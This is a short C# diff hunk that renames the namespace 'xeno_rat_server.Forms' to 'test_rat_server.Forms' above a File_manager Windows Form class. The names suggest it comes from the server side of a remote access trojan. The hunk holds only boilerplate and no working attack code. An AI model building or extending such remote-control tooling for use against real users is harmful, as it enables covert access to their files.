@@ -11,7 +11,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
-namespace xeno_rat_server.Forms
+namespace test_rat_server.Forms
 {
     public partial class File_manager : Form
     {
